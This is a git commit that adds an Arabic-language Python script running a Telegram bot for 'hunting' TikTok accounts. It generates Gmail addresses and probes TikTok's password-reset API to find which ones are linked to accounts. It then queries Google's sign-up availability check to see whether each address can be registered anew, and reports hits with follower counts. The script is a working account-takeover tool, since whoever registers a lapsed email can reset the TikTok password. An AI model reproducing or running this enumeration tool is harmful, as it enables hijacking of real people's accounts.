05a49924cf6eb0cb56c6b36e50f28079ec009a3e
المبرمج اسامة فاضل <157139406+HACKSOSS@users.noreply.github.com>
2024-06-19 00:04:09 +0300

    Add files via upload

---
+++ اداتي تيك توك اصدارات.py
@@ -0,0 +1,184 @@
+import datetime
+import random
+import threading
+import requests,telebot
+from telebot import types
+import re
+from re import findall
+import requests,random,time
+e=0
+import requests
+import gdolib
+import random
+import json
+import requests,os,names,json,random
+import requests,os,names,random,time,webbrowser
+from user_agent import generate_user_agent
+from uuid import uuid4
+uid = uuid4()
+import requests,random,mechanize,time
+import requests,random,mechanize,datetime
+import requests,sys,os,time
+import requests,random,mechanize,time
+import requests,random,mechanize,datetime
+r = requests.session()
+now = datetime.datetime.today()
+now = datetime.datetime.today()
+mm = str(now.month)
+dd = str(now.day)
+yyyy = str(now.year)
+hour = str(now.hour)
+mi = str(now.minute)
+ss = str(now.second)
+t=(mm + "/" + dd + "/" + yyyy + " " + hour + ":" + mi + ":" + ss)
+hours = (now.hour)
+x = datetime.datetime.now()
+g= datetime.datetime(2022, 11, 22, 2, 00 ,0)
+
+if (x.strftime("%x"))>(g.strftime("%x")):
+ print( '\n\n' )
+ 
+ print( '\n\n' )
+ print(x)
+ print("تم ايقاف الاداه بواسطه القياده112حاكم الهكسوس انتظر تحديثها او اطلب من الحاكم تحديثها ☜ KY_112@")
+ 
+ sys.exit(0)
+ 
+
+if (x.strftime("%x"))==(g.strftime("%x")):
+   print(  ''  )
+   if(x.strftime("%X"))>(g.strftime("%X")):
+    print(  '\n\n ' )
+   
+    print(  '\n\n'  )
+    print(x)
+    print ("تم انتهاء وقت تشغيل الاداه اذهب لحاكم الهكسوس واطلب منه تحديث الاداه ")
+    sys.exit(0)
+   else:
+    
+    print( ''  )  
+else:
+    print( ''   )
+print(   '')
+#============(ألاوان)=============
+Z = '\033[1;31m' #احمر
+X = '\033[1;33m' #اصفر
+Z1 = '\033[2;31m' #احمر ثاني
+F = '\033[2;32m' #اخضر
+A = '\033[2;34m'#ازرق
+C = '\033[2;35m' #وردي
+C = "\033[1;97m" #ابيض
+B = '\033[2;36m'#سمائي
+Y = '\033[1;34m' #ازرق فاتح
+E = '\033[1;31m' #احمر
+webbrowser.open(  'https://t.me/HACKEEM_AL_HACKSOOS'  )
+
+pss=input(Z+"الاده مشفره ادخل الباسورد :  ")
+if pss ==  'hackeemalhacksoss'  : 
+ pass
+ print(F+"لقد وافق الحاكم علا دخولك بنجاح☑")
+ time.sleep(1)
+ os.system(   'clear '   )
+else:
+ exit(  "الباسورد خطا  ❌"   )
+def azz():
+	azro = (f"""{C} 
+{B} < 𝐘𝐎 ➸ @l._   اداه صيد يوزرات  ثنائيه وشبه ثنائيه يوتيوب 
+{F}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+{Z}┃  {F}فخامه مطور ᓄ/اسامه الفخم للتقنيه والامن 
+{Z}┃ ---------------------
+{Z}┃  {X}+967730189500  > مبرمج الاداه 
+{Z}┃ ----------------------
+{Z}┃  {F}@KY_112 > معرفي تلكرام
+{Z}┃ ----------------------
+{Z}┃  {X}@K_Y_1_1_2 > معرف قناتي 
+{F}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
+print(X+'''< افخم اداه صيد متاحات تيك توك بواسطه
+ الجلاد القياده112حاكم الهكسوس➸
+┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+┃  فخامه مطور ᓄ/اسامه الفخم للتقنيه والامن 
+┃ -----------------
+┃  +967730189500  > مبرمج الاداه 
+┃ ----------------------
+┃  @KY_112 > معرفي تلكرام
+┃ ----------------------
+┃  @K_Y_1_1_2 > معرف قناتي 
+┗━━━━━━━━━━━━━━━━━━━━━ ━━━━━━''')
+bot = telebot.TeleBot(input(F+"                                                                                                  . . يقلك الحاكم ادخل التوكن بوت                    وبعدها اذهب لبوتك واضغط 𝐒𝐓𝐀𝐑𝐓 "))
+@bot.message_handler(commands=['start'])
+def start(message):
+    key = types.InlineKeyboardMarkup()
+    key.row_width = 1
+    btn = types.InlineKeyboardButton(text="- ا★ضغط هنا ياتابع للحاكم★ .",callback_data="start")
+    key.add(btn)
+    bot.reply_to(message,f"- ★افخم بوت صيد متاحات تيك توك من تطوير اسامه الفخم للتقنيه والامن★ ..\n- يمكنك تشغيل البوت من خلال الزر ادناه👇 .",reply_markup=key)
+@bot.callback_query_handler(func=lambda m:True)
+def qw(call):
+    if call.data == "start":
+        bot.send_message(call.message.chat.id,f"- بدء الفحص...                               تم برمجه الاداه بواسطه القياده112حاكم الهكسوس  قناه المطور @HACKEEM_AL_HACKSOOS")
+        gen(call.message)
+def gen(message):
+    global i
+
+    for i in range(100234):
+        ran = random.randint(100,1221)
+        gen = f"gaixinhxinhgai{ran}"
+        email = f"{gen}" + "@gmail.com"
+        check(message,email)
+def check(message,email):
+    faliure = 0
+    true = 0
+    url = f"https://api2-16-h2.musical.ly/aweme/v1/passport/find-password-via-email/?app_language=en&manifest_version_code=2018101933&_rticket=1640498724713&iid=7045258653545678597&channel=googleplay&language=en&fp=&device_type=JKM-LX1&resolution=1080*2137&openudid=12c019d2ff003ae0&update_version_code=2018101933&sys_region=US&os_api=28&is_my_cn=0&timezone_name=Asia%2FBaghdad&dpi=408&carrier_region=IQ&ac=3g&device_id=6842870495047812614&mcc_mnc=41805&timezone_offset=10800&os_version=9&version_code=880&carrier_region_v2=418&app_name=musical_ly&ab_version=8.8.0&version_name=8.8.0&device_brand=HUAWEI&ssmix=a&pass-region=1&build_number=8.8.0&device_platform=android&region=US&aid=1233&ts=1640498723&as=a1f6304c330281f6084477&cp=0e28166a3f85cd68e1OeWi&mas=011642394e9220eefdfcb08b2bbe4539f5ecec2c2c1c0c6c668c1c"
+    data = f"app_language=en&manifest_version_code=2018101933&_rticket=1640498724713&iid=7045258653545678597&channel=googleplay&language=en&fp=&device_type=JKM-LX1&resolution=1080*2137&openudid=12c019d2ff003ae0&update_version_code=2018101933&sys_region=US&os_api=28&is_my_cn=0&timezone_name=Asia%2FBaghdad&dpi=408&email={email}&retry_type=no_retry&carrier_region=IQ&ac=3g&device_id=6842870495047812614&mcc_mnc=41805&timezone_offset=10800&os_version=9&version_code=880&carrier_region_v2=418&app_name=musical_ly&ab_version=8.8.0&version_name=8.8.0&device_brand=HUAWEI&ssmix=a&pass-region=1&build_number=8.8.0&device_platform=android&region=US&aid=1233"
+    az = (requests.post(url, data=data).text)
+
+    if  "Sent successfully" in az:
+
+        h = {
+            'Content-Length': '98',
+            'Content-Type': 'text/plain; charset=UTF-8',
+            'Host': 'android.clients.google.com',
+            'Connection': 'Keep-Alive',
+            'user-agent': 'GoogleLoginService/1.3(m0 JSS15J)', }
+        d = {
+            'username': f"{email}",
+            'version': '3',
+            'firstName': 'Dev',
+            'lastName': 'Sarot'}
+        res = requests.post('https://android.clients.google.com/setup/checkavail', json=d, headers=h).text
+
+        if "SUCCESS" in res:
+            try:
+                em = email.split("@gmail.com")[0]
+                tt = requests.get(f"https://mr-abood.herokuapp.com/TikTok/Info?username={em}").json()
+                follower_count = tt['follower_count']
+                following_count = tt['following_count']
+                true+=1
+                kk = f"""
+تم صيد متاح تيك توك بواسطه القياده112حاكم الهكسوس
+Username = {em}
+Email : {email} 
+Followers : {follower_count}
+Following : {following_count}
+date : {datetime.datetime.now()}
+                """
+                bot.send_message(message.chat.id,f"<strong>{kk}</strong>",parse_mode="html")
+                print(
+                    f'Email : {email} | Followers : {follower_count} | Following : {following_count} | Username : {em}')
+
+                print("============================================")
+            except:
+                pass
+    else:
+        key2 = types.InlineKeyboardMarkup()
+        key2.row_width = 1
+        btn2 = types.InlineKeyboardButton(text="- 𝐁𝐘",url="t.me/K_Y_112")
+        key2.add(btn2)
+        faliure +=1
+        k = f"""
+بدء الفحص ..
+- يتم فحص على : {email}
+- تم الفحص : {i}
+        """
+        bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text=f"<strong>{k}</strong>",parse_mode="html")
+bot.infinity_polling()
